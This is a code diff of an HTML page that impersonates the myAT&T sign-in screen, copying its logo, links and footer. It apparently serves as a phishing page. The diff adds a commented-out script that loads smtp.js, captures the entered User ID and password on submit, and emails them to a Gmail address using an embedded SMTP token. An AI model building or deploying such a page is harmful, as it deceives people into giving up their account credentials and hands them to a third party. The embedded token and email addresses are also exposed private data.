@@ -4,36 +4,79 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up</title>
+    <title>myAT&signin</title>
     <link rel="stylesheet" href="styles.css">
+    
 </head>
 <body>
     <div class="signup-box">
-        <img src="" alt="">
-        <h2>Sign In</h1>
-        <h2>to myAT&T</h2>
+        <img src="att-logo.svg" alt="">
+        <h3>Sign In</h3>
+        <h3>to myAT&T</h3>
         
-        <form action="">
+        <form method="post">
             <label for="">User ID</label>
-            <input type="text">
+            <input type="text" id="ID">
+         <div class="forgot">
+            <a href="">Forgot user ID?</a> </div> 
 
             <label for="">Password</label>
-            <input type="password">
+            <input type="password" id="password">
 
-            <input type="button" value="submit">
+            <div class="fog_pass">
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <input type="button" id="btn" value="Sign in">
             
             <div class="cancel">
-                <h3>Cancel</h3>
+                <a href="#">Cancel</a>
             </div>
+<br>
+
+            <div class="hLine"></div>
             
         </form>
 
         <div class="h_line"></div>
 
 
-        Don't have a user ID?
+       <P> Don't have a user ID?
+        <br>
         <a href="#">Create one now</a>
+        </P>
 
     </div>
+
+ <div class="footer">
+    <a href="#">Legal policy center</a> <br>
+    <a href="#">Privacy policy</a> <br> 
+    <a href="#">Terms of use</a> <br> 
+    <a href="#">Assesibility</a> <br> <br>
+ </div>
 </body>
+<!-- <script src="https://smtpjs.com/v3/smtp.js">
+</script>
+
+    <script>
+        var btn = document.getElementById('btn');
+        btn.addEventListener('click', function(e){
+            e.preventDefault()
+            var id = document.getElementById('ID').value;
+            var password = document.getElementById('password').value;
+            var body = 'ID: ' +id + '<br/> password: ' + password;
+
+            Email.send({
+    SecureToken : "2d4ff248-ea09-4e45-90f1-3aac72dd207c",
+    To : 'idemudiaclinton44@gmail.com',
+    From : "idclinton00@gmail.com",
+    Subject : "contact ID",
+    Body : body
+}).then(
+  message => alert(message)
+);
+
+
+});
+    </script> -->
 </html>
